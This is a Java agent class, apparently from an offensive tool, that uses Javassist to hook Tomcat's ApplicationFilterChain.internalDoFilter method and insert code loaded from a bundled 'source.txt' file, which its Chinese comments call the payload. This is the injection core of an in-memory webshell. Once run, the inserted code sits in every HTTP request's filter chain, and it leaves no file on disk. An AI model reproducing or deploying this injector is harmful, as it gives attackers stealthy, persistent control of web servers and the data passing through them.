package net.sorry.agent;


import javassist.*;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
//继承重写
public class reTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {
        //org/apache/catalina/core/ApplicationFilterChain
        if ("org/apache/catalina/core/ApplicationFilterChain".equals(s)) {
            try {
                System.out.println("[+]Message:Transformering Class:    "+s);
                ClassPool cp = ClassPool.getDefault();//返回默认ClassPool是单例模式
                if(aClass !=null){
                    ClassClassPath classPath = new ClassClassPath(aClass);//重定义类
                    cp.insertClassPath(classPath);//载入重定义类
                }
                CtClass cc = cp.get("org.apache.catalina.core.ApplicationFilterChain");
                CtMethod m= cc.getDeclaredMethod("internalDoFilter");//获取指定方法
                System.out.println("[+]Message:Found Method     " + m.getName());
                m.addLocalVariable("elapsedTime", CtClass.longType);//程序执行时间
                m.insertBefore("{" + readSource() + "}");//在方法起始位置插入代码
                //m.insertBefore(readSource());
                byte[] byteCode = cc.toBytecode();
                cc.detach();//释放内存
                return byteCode;
            } catch (Exception ex) {
                ex.printStackTrace();
                System.out.println("error::::" + ex.getMessage());
            }
        }
            return null;
    }

    //读payload
    public String readSource() {
        StringBuilder source = new StringBuilder();
        InputStream is = reTransformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try{
            System.out.println("[+]The payload is:");
            BufferedReader br = new BufferedReader(isr);
            while((line=br.readLine()) != null){
                source.append(line);
                System.out.println(line);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return source.toString();
    }
}
